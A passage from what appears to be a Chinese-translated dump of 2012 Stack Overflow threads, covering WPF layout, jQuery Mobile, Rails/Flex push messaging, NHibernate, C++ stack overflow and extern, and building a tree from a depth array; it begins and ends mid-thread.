<UserControl.Resources>       
    <local:VisibilityConverter x:Key="VisibilityConverter"/>
    <local:ColumSpanConverter x:Key="ColumSpanConverter"/>        
</UserControl.Resources>

    <ListBox x:Name="lst" HorizontalAlignment="Left"  Margin="6,6,0,0"  VerticalAlignment="Top" Width="400"    
                  ItemsSource="{Binding Path=MyQueue}"   
                      SelectedItem="{Binding Path=CurrentQueue, Mode=TwoWay}" Height="380" >
                <ListBox.ItemTemplate>
                    <DataTemplate>
                        <Border BorderThickness="1,1,1,1" BorderBrush="Blue">
                            <Grid x:Name="grd" Width="auto" HorizontalAlignment="Stretch"  >                                  
                                    <Grid.RowDefinitions>                                          
                                    <RowDefinition Height="auto"/>
                                </Grid.RowDefinitions>
                                    <Grid.ColumnDefinitions>
                                        <ColumnDefinition Width="35" />
                                        <ColumnDefinition Width="250"/>
                                        <ColumnDefinition Width="125" />
                                    </Grid.ColumnDefinitions>
                                    <Image Source="{Binding Type}" Grid.Row="0" Grid.Column="0"/>
                                    <TextBlock  Grid.Row="0" Grid.Column="1"  Grid.ColumnSpan= "{Binding isSpan, Converter={StaticResource ColumSpanConverter}}" Text="{Binding summary}" TextWrapping="Wrap"
                                             Style="{StaticResource PhoneTextAccentStyle}"  />
                                    <Button x:Name="btnAction" Grid.Row="0" Grid.Column="3" ClickMode="Press" Click="btnAction_Click" Style="{StaticResource ButtonStyle1}"
                                            Visibility="{Binding isVisibility, Converter={StaticResource VisibilityConverter}}"
                                         Tag="{Binding callNumber}">

                                        <Button.Content>
                                            <TextBlock Width="85" Height="70" Text="{Binding ActionCaption}" 
                                                       Style="{StaticResource LabelStyle_20}"     />
                                        </Button.Content>
                                    </Button>

                                </Grid>
                                </Border>
                    </DataTemplate>                    

                </ListBox.ItemTemplate>
            </ListBox> 
```

方向更改代码：

```
 private void TestPage_OrientationChanged(
object sender, OrientationChangedEventArgs e)
    {
        ListBox lstControl = lst.lst;           
        Grid g = lstControl.ItemContainerGenerator.ContainerFromIndex(0) as Grid;   

        if (e.Orientation.ToString().Contains("Portrait"))                
             lst.lst.Height = 400;

        else                        
        lst.lst.Height = 120;
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-27T17:03:18.787

您应该使用百分比或“星号”来代替列宽的绝对值。星形大小允许列的宽度（或行的高度）随着可用大小的变化而增长或缩小。

这是一个使用示例：

```
<Grid.ColumnDefinitions>
    <ColumnDefinition Width=".1*" />
    <ColumnDefinition Width=".6*"/>
    <ColumnDefinition Width=".3*" />
</Grid.ColumnDefinitions> 
```

除此之外，您应该删除 ListBox 的 Width 值并允许它填充所有可用空间。

# javascript - Javascript/Css 导航未显示在 jquery 文档上，仅在 ie 中准备好

> ID：12146184
> 
> 赞同：0
> 
> 时间：2012-08-27T16:55:10.113
> 
> 标签：javascript, jquery, css

我正在使用动态驱动器 ddsmoothmenu 脚本来显示我们网站的导航。为了防止在页面加载时菜单立即显示，我在文档就绪时添加了一个 show() 函数。这适用于除 ie 之外的所有浏览器。有人可以看看[http://www.idataresearch.com](http://www.idataresearch.com)并让我知道是否有任何问题。谢谢你。PS我已经接手了一个失败的开发者，所以请原谅混乱。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-27T17:18:15.667

为避免出现在 945 行中的错误，请尝试更改您的 if 条件：

从：

```
if ( allowReverse && !document.layers ) { ... } 
```

到：

```
if ( typeof allowReverse == 'undefined' && allowReverse != false && !document.layers ) { ... } 
```

它可能导致其他功能/脚本失败

# ruby-on-rails - 使用 Rails 和 Flex 的首选方式是什么？

> ID：12146188
> 
> 赞同：1
> 
> 时间：2012-08-27T16:55:22.063
> 
> 标签：ruby-on-rails, ruby, apache-flex, push

我想创建一个服务，类似于聊天应用程序（实时应用程序）。

从我的研究中可以看出，`BlazeDS`是首选方式，但它涉及 Java 和 Java EE。此外，最新的 Ruby 结果似乎是从 2009 年到 2010 年，所以它们可能已经过时了。

是否有任何积极维护的 Ruby/Rails 解决方案用于将推送通知与 Flex 集成？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-30T22:47:48.500

## 目前的情况

您*必须*使用 Flex 吗？HTML5 [websockets](http://pusher.com/websockets)是一项新兴但不断发展的技术，现在已经有了实现。Flex 的日子屈指可数。然而，websockets 在 IE 中还没有原生支持。

*   [em-websocket](https://github.com/igrigorik/em-websocket)是一个基于 eventmachine 的 ruby​​ websocket 服务器。服务[Pusher](http://pusher.com/)就是基于它。
*   [Faye](https://github.com/faye/faye-websocket-ruby)是一个 websocket 服务器和客户端。（[铁路广播](http://railscasts.com/episodes/260-messaging-with-faye)）
*   还有其他 Ruby 实现，例如[Cramp](http://cramp.in/)和[Socky](https://github.com/socky/socky-server-ruby)。
*   如果您对 Node 等其他技术中的服务器持开放态度，那么有许多 Ruby 或 Javascript 客户端已准备就绪。

**更新**：我可能会提到不久前我曾考虑用 Flex 做一些类似的事情，并得到了一份[Flex on Rails](http://www.flexonrails.com/book.html)的副本。本书的[服务器推送示例](https://github.com/danielwanja/flexonrails/tree/master/20_Server_Push_with_Juggernaut)使用了[剑圣](http://juggernaut.rubyforge.org/)，不幸的是它已经[停止了进一步的开发](http://blog.alexmaccaw.com/killing-a-library)。作者指出，[服务器发送事件](http://en.wikipedia.org/wiki/Server-sent_events)(SSE) 使 Juggernaut 变得多余。[除 IE 之外](http://caniuse.com/eventsource)的所有主流浏览器都原生支持它们，类似于[websockets 的情况](http://caniuse.com/websockets)。

有一些垫片（“ [polyfills](http://remysharp.com/2010/10/08/what-is-a-polyfill/) ”）使用 javascript 将[这些缺失](https://github.com/Modernizr/Modernizr/wiki/HTML5-Cross-Browser-Polyfills)的功能带到浏览器中。例如，[jQuery Graceful WebSocket](https://github.com/ffdead/jquery-graceful-websocket)是一个 jQuery 插件，它实现了一个 websocket 客户端，但回退到 AJAX 轮询，因此该功能仍然可以在 IE 中工作，只是不会那么即时。因为它检测到 websocket 支持，所以只要浏览器支持 websocket，它们就会被使用。

## 弥合差距

我们似乎陷入了一个过渡时期，我们正处于 Flash 的日落时代，但尚未获得对其替代技术的广泛支持。有一个库可以弥补这一差距：[Socket.IO](http://socket.io/)。该库在运行时选择最强大的技术传输。它将使用 Flash（如果存在），但也可以使用 websockets、AJAX 长轮询、AJAX 多部分流、必要时“永久 iframe”。这为其提供了广泛的浏览器支持：

*   IE 5.5+
*   野生动物园 3+
*   谷歌浏览器 4+
*   火狐 3+
*   歌剧 10.61+
*   苹果浏览器
*   iPad Safari
*   安卓网络套件
*   WebOS Webkit

这实际上比单独的 Flash/Flex 或 WebSockets 具有更广泛的兼容性。Socket.IO 是在服务器端和客户端的 Javascript 中实现的，因此您需要一个服务器端 Javascript 运行时，例如 Node.js。

## 可能的解决方案

虽然目前似乎没有很多对 Rails 3 -> Flex 解决方案的引用（如您所见），但 Ruby/Rails 和 Socket.IO 的组合似乎具有一定的吸引力。

如果您想使用 Socket.IO 向 Rails 应用程序添加聊天，Liam Kaufman 有一篇很好的参考博客文章，他使用 Socket.IO 在 Rails 3 中创建了一个聊天应用程序：http: [//liamkaufman.com/blog/2012/02 /25/adding_real-time_to_rails_with_socket.IO_nodejs_and_backbonejs_with_demo/](http://liamkaufman.com/blog/2012/02/25/adding_real-time_to_rails_with_socket.IO_nodejs_and_backbonejs_with_demo/)

还有一个[socket.io gem](http://rubygems.org/gems/socket.io)，它增加了对上述 Cramp 服务器的支持。

在使用 Rails 3 和 Socket.IO 组合的其他人看来，似乎还有其他 stackoverflow 问题。

## TL;DR 总结

虽然没有太多迹象表明人们不再从 Rails 直接到 Flex，但还有其他解决方案，最有希望的是 Rails 和 Socket.IO 的组合。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-03T15:25:54.737

如果您想生活在 Ruby 世界中，您可以使用常规[WebSockets](https://github.com/igrigorik/em-websocket)与 Flex 应用程序通信。它不会很漂亮，但它会起作用，并且您可以避免使用 Java 后端。这比告诉 BlazeDS 扔结构更原始，但它应该是可行的。

在 Flex 客户端，有一个由[Kaazing](http://kaazing.com/download.html)编写的库，与他们的 WebSocket 服务器捆绑在一起。下载他们的一个 WebSocket 服务器，在 client-libs 文件夹中，应该有一个 swc（带有文档），您可以使用它来与 em-websocket（或者实际上是任何 websocket 技术）交谈。

现在，说了这么多，你几乎没有 BlazeDS 或 GraniteDS 的可扩展性，但它应该适用于较小的实现和演示。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-05T13:37:45.953

您可以使用[https://github.com/rubyamf/rubyamf](https://github.com/rubyamf/rubyamf)或[https://github.com/victorcoder/rubyamf_plugin](https://github.com/victorcoder/rubyamf_plugin)

但是你会遇到实时消息传递的问题，因为 ruby​​amf 和 ruby​​amf_plugin 不支持 RTMP。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-07T19:06:52.480

您可以使用[RestfulX](http://restfulx.github.com/) gem & Flex 框架。这就是我用于 Rails/Flex 的。

# wpf - 检查屏幕是否被修改的好方法是什么？

> ID：12146191
> 
> 赞同：0
> 
> 时间：2012-08-27T16:55:39.873
> 
> 标签：wpf, data-binding, caliburn.micro

您能否建议一种优雅的方法来检查视图上的数据是否已被修改以相应地启用“保存”按钮？

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-27T17:06:31.720

假设您将 MVVM 与 Caliburn.micro 一起使用，则有一个 Can-convention 命令。因此，假设您想在名为 Username 的字符串属性非空时启用 Save 按钮，您只需将此方法添加到视图模型：

```
public bool CanSave()
{
    if(String.IsNullOrEmpty(UserName))
        return false;

    return true;
} 
```

假设您的类继承了 PropertyChangedBase 或 Screen，并且您有一个 Name="Save" 的按钮，如果 UserName 为空，它将被禁用。如果您对视图中的数据更改感兴趣，则相关属性（在此示例中为 UserName）当然必须绑定到视图中的某个输入区域 - 例如，您可以有一个名为 UserName 的 TextBox，这将使 Caliburn 设置约定俗成的约束。

整个类将如下所示：

**编辑为只允许保存实际不同的数据**

```
public class UserViewModel : PropertyChangedBase
{
    private string _savedUserName;

    public string UserName{ get; set; }

    public bool CanSave()
    {
        return !UserName.Equals(_savedUserName);
    }

    public void Save()
    {
        //Save the data

        _savedUserName = UserName;
    }
} 
```

# thrift - Thrift : TFramedTransport 总有效载荷长度

> ID：12146194
> 
> 赞同：1
> 
> 时间：2012-08-27T16:56:08.047
> 
> 标签：thrift

我正在编写一个解码器来解码和打印出 Thrift 消息以及存储在 PCAP 文件中的其他协议消息。

当我查看 Thrift 数据包时，对于某些 Thrift 消息，我会在负载（前 4 个字节）中看到总长度信息，然后是 Thrift 消息（80 01...）。

对于其他一些 THrift 消息，我看不到数据包中的总长度信息，但它在发送 Thrift 数据包之前以单独的数据包（有效负载大小为 4）发送出去。

进一步调查我发现使用 TFramedTransport 发送总长度信息，但为什么不发送一些 Thrift 消息？

谢谢，普拉巴卡尔

# jquery - Jquery mobile永远不会重新加载请求的第一页

> ID：12146197
> 
> 赞同：2
> 
> 时间：2012-08-27T16:56:23.997
> 
> 标签：jquery, asp.net-mvc-3, mobile, jquery-mobile, razor

所以我使用启用了不显眼的 ajax 的 Jquery mobile。所有 URL 都共享保存布局页面（即相同的 div data-role="page"）。

我的问题是当我加载一个 url 例如： /home/events 它加载所有正确的东西，但如果我使用页面上的链接浏览页面，每次我回到 /home/events 它只是使用缓存它在我第一次到达我的页面时加载的版本。

我运行了 Firebug，所以我可以看到原始页面永远不会重新加载，我不知道为什么。无论首先加载哪个页面/home/events、/home/details、/home/someotherpage，问题都是一样的，只要我单击指向此 URL 的链接，它就会使用第一次加载时的缓存版本.

任何帮助是极大的赞赏 ！

编辑：问题不是服务器正在缓存任何东西，问题是每当我单击指向我请求的第一个 url 的链接时，JQueryMobile 拒绝发送新的 HTTP 请求。

Edit2：不要在任何地方使用 rel="external" 因为我想使用甜美的页面转换。

所以显然不是一个错误，在这里讨论它的线程，还提供了丑陋的黑客解决方案： [https ://github.com/jquery/jquery-mobile/issues/3249](https://github.com/jquery/jquery-mobile/issues/3249)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-27T17:08:31.707

您可以通过在操作上设置 OutputCache 属性来关闭缓存：

```
[OutputCache(Location = OutputCacheLocation.None)]
public virtual ActionResult Events()
{
} 
```

# c# - NHibernate Group By 多对多关联

> ID：12146200
> 
> 赞同：1
> 
> 时间：2012-08-27T16:56:42.173
> 
> 标签：c#, linq, nhibernate

我需要执行一个查询来连接两个表，按值分组，并返回组键和计数。

```
CREATE TABLE Message(
  ID INT NOT NULL
, Note NVARCHAR(128));

CREATE TABLE Message_Users(
  MessageID INT NOT NULL
, UserID NVARCHAR(128) NOT NULL); 
```

我需要执行这个查询：

```
SELECT mu.UserID, COUNT(m.ID)
FROM Message m
JOIN Message_Users mu
   ON m.ID = mu.MessageID
GROUP BY mu.UserID; 
```

我怎样才能使用 NHibernate 做到这一点？Message 表映射如下：

```
<?xml version="1.0" encoding="utf-8" ?>
<hibernate-mapping xmlns="urn:nhibernate-mapping-2.2" assembly="DataModel" namespace="DataModel.Message">
  <class name="Message" table="Message">
    <id name="ID">
      <generator class="native" />
    </id>
    <bag name="AssociatedUsers" table="Message_Users" lazy="false">
      <key column="MessageID" />
      <element column="UserID" type="System.String" />
    </bag>
  </class>
</hibernate-mapping> 
```

我看过其他几个问题，但没有一个完全符合这个用例（很多 GroupBy，但没有关联；[很多加入，但没有 group by](https://stackoverflow.com/questions/3900779/nhibernate-queryover-with-manytomany)）

我已经开始朝两个方向前进：

// 第一次尝试

```
// Doesn't work as message.AssociatedUsers is a collection, so mu.Key is actually a collection
var query = transactionContext.Session.Query<Message>();    
var r = from message in query
        group message by message.AssociatedUsers into mu
        select new {UserID = mu.Key, Count = mu.Count()}; 
```

// 第二次尝试

```
var query = transactionContext.Session.QueryOver<Message>();
var join = query.Right.JoinQueryOver<string>(_message => _message.AssociatedUsers);
var select = join.Select(
      // Select generic parameter doesn't seem to be related to the type of the join (<Message, string>)
    Projections.Group<string>(... 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-28T13:41:22.757

未测试

```
// Option 1
var r = from message in Session.Query<Message>()
        from userid in message.AssociatedUsers
        group userid by userid into g
        select new { UserID = g.Key, Count = g.Count() };

// Option 2
string userId = null;
var r = Session.QueryOver<Message>()
    .JoinQueryOver<string>(m => m.AssociatedUsers, () => userId)
    .SelectList(list => list
        .SelectGroup(() => userid)
        .Select(Projections.Count()))
    .List<object[]>(); 
```

# c++ - 如何在 C++ 中处理或避免堆栈溢出

> ID：12146201
> 
> 赞同：36
> 
> 时间：2012-08-27T16:57:02.530
> 
> 标签：c++, error-handling, crash, stack-overflow

在 C++ 中，堆栈溢出通常会导致程序不可恢复的崩溃。对于需要真正健壮的程序，这是一种不可接受的行为，特别是因为堆栈大小是有限的。关于如何处理问题的几个问题。

1.  有没有办法通过一般技术防止堆栈溢出。（一种可扩展、强大的解决方案，包括处理消耗大量堆栈的外部库等）

2.  有没有办法处理堆栈溢出以防它们发生？最好，堆栈会展开，直到有处理程序来处理这种问题。

3.  那里有一些语言，它们具有带有可扩展堆栈的线程。类似的东西在 C++ 中可能吗？

任何其他关于 C++ 行为解决方案的有用评论将不胜感激。

* * *

## 回答 #1

> 赞同：34
> 
> 时间：2012-08-27T17:20:47.917

处理堆栈溢出不是正确的解决方案，相反，您必须确保您的程序不会溢出堆栈。

不要在堆栈上分配大变量（其中“大”取决于程序）。确保任何递归算法在已知最大深度后终止。如果递归算法可能会递归未知次数或大量次数，要么自己管理递归（通过维护自己的动态分配的堆栈），要么将递归算法转换为等效的迭代算法

一个必须“真正健壮”的程序不会使用“吃很多堆栈”的第三方或外部库。

* * *

请注意，某些平台会在发生堆栈溢出时通知程序并允许程序处理错误。例如，在 Windows 上，会引发异常。此异常不是 C++ 异常，但它是异步异常。虽然 C++ 异常只能由`throw`语句引发，但异步异常可能在程序执行期间的任何时间引发。不过，这是意料之中的，因为堆栈溢出可能随时发生：任何函数调用或堆栈分配都可能溢出堆栈。

问题是堆栈溢出可能会导致异步异常被抛出，即使是从不期望抛出任何异常的代码（例如，从标记的函数`noexcept`或`throw()`在 C++ 中）。因此，即使您确实以某种方式处理了此异常，您也无法知道您的程序处于安全状态。因此，处理异步异常的最佳方法是根本不处理^((*))。如果抛出一个，则意味着程序包含错误。

其他平台可能有类似的“处理”堆栈溢出错误的方法，但任何此类方法都可能遇到相同的问题：预期不会导致错误的代码可能会导致错误。

^((*) 有一些非常罕见的例外。)

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2012-08-27T17:42:21.547

您可以使用良好的编程实践来防止堆栈溢出，例如：

1.  递归要非常小心，我最近看到一个 SO 是由于递归 CreateDirectory 函数写得不好，如果你不确定你的代码是否 100% ok，那么添加将在 N 次递归调用后停止执行的保护变量。或者最好不要编写递归函数。
2.  不要在堆栈上创建巨大的数组，这可能是隐藏的数组，比如一个非常大的数组作为类字段。使用矢量总是更好。
3.  使用 alloca 时要非常小心，特别是如果它被放入一些宏定义中。我已经看到许多 SO 是由于将字符串转换宏放入使用 alloca 进行快速内存分配的 for 循环中造成的。
4.  确保您的堆栈大小是最佳的，这在嵌入式平台中更为重要。如果你的线程做的不多，那么给它小的堆栈，否则使用更大的。我知道保留应该只占用一些地址范围 - 而不是物理内存。

这些是我在过去几年中看到的最常见的原因。

对于自动 SO 查找，您应该能够找到一些静态代码分析工具。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-08-27T18:02:33.347

回复：可扩展堆栈。您可以通过以下方式给自己更多的堆栈空间：

```
#include <iostream>

int main()
{
    int sp=0;

    // you probably want this a lot larger
    int *mystack = new int[64*1024];
    int *top = (mystack + 64*1024);

    // Save SP and set SP to our newly created
    // stack frame
    __asm__ ( 
        "mov %%esp,%%eax; mov %%ebx,%%esp":
        "=a"(sp)
        :"b"(top)
        :
        );
    std::cout << "sp=" << sp << std::endl;

    // call bad code here

    // restore old SP so we can return to OS
    __asm__(
        "mov %%eax,%%esp":
        :
        "a"(sp)
        :);

    std::cout << "Done." << std::endl;

    delete [] mystack;
    return 0;
} 
```

这是 gcc 的汇编语法。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-08-27T17:20:48.837

C++ 是一门强大的语言，而这种强大的力量带来了自取其辱的能力。我不知道发生堆栈溢出时有任何可移植机制来检测和纠正/中止。当然，任何此类检测都是特定于实现的。例如，g++ 提供`-fstack-protector`了帮助监控您的堆栈使用情况。

一般来说，你最好的选择是主动避免基于堆栈的大变量，并小心递归调用。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2021-01-21T07:00:26.607

我认为那行不通。推送/弹出 esp 比移动到寄存器更好，因为您不知道编译器是否会决定使用 eax 做某事。

* * *

## 回答 #6

> 赞同：-1
> 
> 时间：2021-02-15T04:37:33.740

来吧： [https ://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/resetstkoflw?view=msvc-160](https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/resetstkoflw?view=msvc-160)

1.  您不会自己捕获 EXCEPTION_STACK_OVERFLOW 结构化异常，因为操作系统会捕获它（在 Windows 的情况下）。
2.  是的，您可以安全地从结构化异常（上面称为“异步”）中恢复，这与上面所指出的不同。如果您不能，Windows 将根本无法工作。PAGE_FAULT 是从中恢复的结构化异常。

我对 Linux 和其他平台下的工作方式不太熟悉。

# java - Maven 原型：生成目录

> ID：12146207
> 
> 赞同：2
> 
> 时间：2012-08-27T16:57:27.343
> 
> 标签：java, maven, maven-archetype

我正在尝试让我的 Maven 原型根据来自包和 artifactId 之类的用户输入生成目录结构。

这个想法是我有一个类模板：

```
package ${package}.endpoints.${rootArtifactId};

import javax.ws.rs.GET;
import javax.ws.rs.Path;
import javax.ws.rs.Produces;

/** Example resource class hosted at the URI path "/myresource"
*/
@Path("/echo")
public class Echo {

/** Method processing HTTP GET requests, producing "text/plain" MIME media
 * type.
 * @return String that will be send back as a response of type "text/plain".
 */
@GET 
@Produces("text/plain")
public String say() {
    return "Hi there!";
 }
} 
```

并且使用字符串替换可以很好地生成包，但我希望这个文件的输出文件夹也是 /$package/endpoints/$artifactId

我找不到这样做的方法。例如，我可以使用 __artifactId__-context.xml 替换单个文件。但我不知道如何强制 maven 为速度模板文件创建子文件夹。

有任何想法吗？

# jquery - AJAX 加载时缺少 CSS

> ID：12146208
> 
> 赞同：0
> 
> 时间：2012-08-27T16:57:27.243
> 
> 标签：jquery, ajax, jquery-mobile

> **可能重复：**
> [异步包含的 div 的 jQuery Mobile 样式](https://stackoverflow.com/questions/8361705/jquery-mobile-styles-for-an-asynchronously-included-div)
> [Jquery mobile listview - 检查初始化是否完成](https://stackoverflow.com/questions/9493215/jquery-mobile-listview-check-initialization-is-complete)

我有一个移动 jquery 列表视图，最后有一个 LOAD MORE 按钮。一切正常，除了使用 AJAX 添加的新结果中缺少 css。

**这是我的按钮代码**

```
<div data-role="fieldcontain">
            <a onclick="loadmore(this);" type="button" id="showmore" href="#more">Load more..</a>
        </div> 
```

**Javascript**

```
function loadmore(a) {
    jq("#show_more_btn").removeClass("show_more_btn");
    jq("#show_more_btn").addClass("loading_btn");
    jq("this").css("display", "none");
    if (null == jq.cookie("bp-activity-oldestpage")) jq.cookie("bp-activity-oldestpage", 1, {
        path: "/"
    });
    var b = jq.cookie("bp-activity-oldestpage") * 1 + 1;
    jq.post(ajaxurl, {
        action: "activity_get_older_updates",
        cookie: encodeURIComponent(document.cookie),
        page: b
    }, function (a) {
        jq("#show_more_btn").removeClass("loading_btn");
        jq("#show_more_btn").addClass("show_more_btn");
        jq.cookie("bp-activity-oldestpage", b, {
            path: "/"
        });
        jq("li[class='load-more']").hide();
        jq("#activity-stream").append(a.contents);
    }, "json");
    return false
} 
```

**正确列表视图的屏幕截图** [http://s12.postimage.org/yd2hsk119/original.jpg](http://s12.postimage.org/yd2hsk119/original.jpg)

**问题** [http://s17.postimage.org/81ofaf1bz/got.jpg](http://s17.postimage.org/81ofaf1bz/got.jpg)

**编辑：** 列表视图代码

```
<div class="content-primary">   
            <ul data-role="listview"  id="activity-stream">
    <?php endif; ?>

    <?php while ( bp_activities() ) : bp_the_activity(); ?>

        <?php locate_template( array( 'activity/entry.php' ), true, false ); ?>

    <?php endwhile; ?>

    <?php  if ( empty( $_POST['page'] ) ) :  ?>

            </ul>
        </div> 
```

**入口.php**

```
<li id="activity-<?php bp_activity_id(); ?>">
<a href...>...</a>
<h3>...</h3>
<p>...</p>
</li> 
```

任何人都知道问题是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-27T17:02:54.747

您需要`listview`像[这样](http://operationmobile.com/dont-forget-to-call-refresh-when-adding-items-to-your-jquery-mobile-list/)刷新：

```
$("ul").listview('refresh'); 
```

您正在将元素添加到列表中，但 jQuery mobile 没有为它们设置样式，因为它们没有正确的类和属性。

# c++ - 为什么函数不需要外部，但变量需要

> ID：12146211
> 
> 赞同：2
> 
> 时间：2012-08-27T16:57:53.327
> 
> 标签：c++, function, variables, extern

对不起，伙计们，我知道我的英语不好，但我举了一些例子，这样我的问题就更清楚了。

**a.cpp**

```
#include <iostream>

using namespace std;

void funcfoo(){
    cout << "test only" << endl;
}

int varfoo = 10; 
```

**b.cpp**

```
#include <iostream>

using namespace std;

extern void funcfoo();

extern int varfoo;

int main(){

    funcfoo();

    cout << varfoo;

    return 0;
} 
```

**然后我像这样编译它“cl b.cpp a.cpp”**

我的问题是。当我在 void funcfoo() 之前删除“extern 关键字”时它工作正常，但是当我在 int var foo 之前删除 extern 关键字时，我得到了一个错误。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-08-27T17:01:10.973

问题在于每一行代码的含义。`int varfoo`是一个变量的**定义**，而`void funcfoo()`只是一个**声明**。您可以提供多个实体的声明，但只能提供一个*定义*。提供*声明*且仅*声明*变量的语法是通过添加`extern`关键字：`extern int varfoo;`是*声明*

* * *

> 3.1 [basic.def]/2 声明是一个定义，除非它声明一个函数而不指定函数体 (8.4)，它包含 extern 说明符 (7.1.1) 或链接规范25 (7.5)，既不是初始化程序，也不是一个函数体 [...]

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-27T17:00:43.687

当您`extern`从中删除时，`extern void funcfoo();`您将向前声明它，因此您下面的代码将知道是什么`funcfoo()`。如果您要对变量执行此操作，您实际上会实例化它并且会与您的其他文件发生冲突。因此，`extern`它是说“它存在，相信我；）”它是从您的其他文件中解决的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-31T15:21:24.710

另一种思考方式是，当您执行 int varfoo 时，分配内存来保存变量，因此它既是定义又是声明，当您执行 int foo() 时，函数被声明但未定义，因此在某种程度上内存未分配。对于函数，默认情况下链接是外部的，因此删除它并不重要，但对于变量，如果你说 extern int varfoo 编译器不会为它分配内存——它会假设变量是在其他地方定义的。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-02-16T13:13:08.663

I know this might be late, but I hope this helps in some way. Check the link below and it ll give an idea of what extern is and how it works.

```
http://www.geeksforgeeks.org/understanding-extern-keyword-in-c/ 
```

Thank you

# xps - 如何合并 .xps 文件？

> ID：12146212
> 
> 赞同：0
> 
> 时间：2012-08-27T16:57:54.917
> 
> 标签：xps, xpsdocument

有没有办法将多个文档合并到 .xps 文件中？我希望我可以做到这一点而无需安装第三方软件。任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：-2
> 
> 时间：2012-08-27T20:28:27.430

有一个[代码示例](http://msdn.microsoft.com/en-us/library/dd372938%28VS.85%29.aspx)演示了如何在 Windows 7 中将文档与 XPS 对象模型合并。

# c# - 将深度数组转换为树的高效算法

> ID：12146214
> 
> 赞同：3
> 
> 时间：2012-08-27T16:58:01.653
> 
> 标签：c#, algorithm, tree

我有一个存储过程，它返回按树组织的名称的平面列表。为了传达谁是有深度值的父级，因此 5 条记录（最多 3 级）的结果如下所示：

```
Depth|Name
----------
    0|Ford
    1|Compact Cars
    2|Pinto
    1|Trucks
    2|H-Series 
```

我试图通过读取深度值从这个数组中构造一个树。有没有一些明显的算法可以从这样的数据序列中构造一棵树？我添加了 C# 标记，因为我对 LINQy 解决方案持开放态度，尽管通用的计算机科学答案会非常有帮助。

这是我目前的尝试：

```
class Record
{
  public string Name{ get; set; }
  public List<Record> children { get; set; }
}

var previousLevel = 0;
var records = new List<Record>();

foreach (var thing in TreeFactory.fetch(dao))
{
  if(this.Depth == 0) {
    //Root node
  } else if(thing.Depth > previousLevel) {
    //A Child of the last added node
  } else if(thing.Depth < previousLevel) {
    //A Cousin of the last added node
  } else {
    //A Sibling of the of the last added node
  }
  previousLevel = this.Depth;
} 
```

我所说的“高效”是指列表大小最多为 200,000 个元素，树最多可扩展到 100 个级别，所以实际上我只是在寻找更容易推理的东西。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-27T17:09:06.353

这里不需要递归。我相信最快的方法是：

```
public static TreeView TreeFromArray(Item[] arr)
{
    var tv = new TreeView();
    var parents = new TreeNodeCollection[arr.Length];
    parents[0] = tv.Nodes;

    foreach (var item in arr)
    {
        parents[item.Depth + 1] = parents[item.Depth].Add(item.Name).Nodes;
    }

    return tv;
} 
```

项目是任何具有深度和名称信息的东西：

```
public class Item
{
    public int Depth;
    public string Name;
} 
```

当使用我自己的 TreeNode 实现时，为了简化过程并将其从降低整个过程速度的不必要功能中剥离出来，并稍微改变方法以适应这些变化，我想出了这个：

**课程：**

```
 public class Node
    {
        public string Name;
        public List<Node> Childs = new List<Node>();
    }

    public class Item
    {
        public int Depth;
        public string Name;
    } 
```

**执行：**

```
 public static Node TreeFromArray(Item[] arr)
    {
        var tree = new Node();

        var parents = new Node[arr.Length];
        parents[0] = tree;

        foreach (var item in arr)
        {
            var curr = parents[item.Depth + 1] = new Node {Name = item.Name};
            parents[item.Depth].Childs.Add(curr);
        }

        return tree;
    } 
```

**结果：**

> 使用给定数据：900 毫秒内 1,000,000 次

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-27T17:03:09.420

```
public void AddNode(Tree tree, Node nodeToAdd, int depth)
{
  //you might need to add a special case to handle adding the root node
  Node iterator = tree.RootNode;  
  for(int i = 0; i < depth; i++)
  {
    iterator = iterator.GetLastChild(); //I assume this method won't exist, but you'll know what to put here
  }

  iterator.AddChild(nodeToAdd);
} 
```

这有点像伪代码。它没有添加错误处理，我假设代码部分存在方法，我想你可以自己弄清楚。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-27T17:05:36.837

这个数组看起来像是原始树结构的从左到右的“展平”。如果可以安全地假设，那么方法很简单：

```
For each element in the array
   If the depth of the element is less than or equal to the "current node"
      traverse upwards to the parent until current depth = element depth -1
   Create a child node of the current node
   Traverse to that node as the new "current" node 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-27T17:08:01.273

原料：

1.  允许子节点的类。
2.  此类类型的堆栈。
3.  此类类型的数组或列表。
4.  用于存储当前深度的 int。
5.  持有我们当前感兴趣的项目的本地人。

方法。

1.  从列表中取出您的第一项。将其放入堆栈中。存储`0`为当前深度。
2.  依次从列表中取出每个剩余的项目。看它的深度。如果深度等于或小于当前深度，则从堆栈中弹出（currentdepth - depth + 1）项，并在堆栈中窥视以获取新的当前项。使我们的新项成为“当前项”的子项，使其成为当前项，使其深度成为当前深度。

在编译器中以 200°C 或 Gas-mark 6 烘烤 300 毫秒，或直至金黄色。

# android - Android - JQuery 谷歌地图

> ID：12146216
> 
> 赞同：0
> 
> 时间：2012-08-27T16:58:28.160
> 
> 标签：android, jquery, cordova, map

我正在创建一个使用 Phonegap 和 JQuerymobile 的应用程序。可以使用 JQuery 在我的应用程序中插入谷歌地图吗？我该怎么做？

谢谢 ：）

* * *

## 回答 #1

> 赞同：0
> 
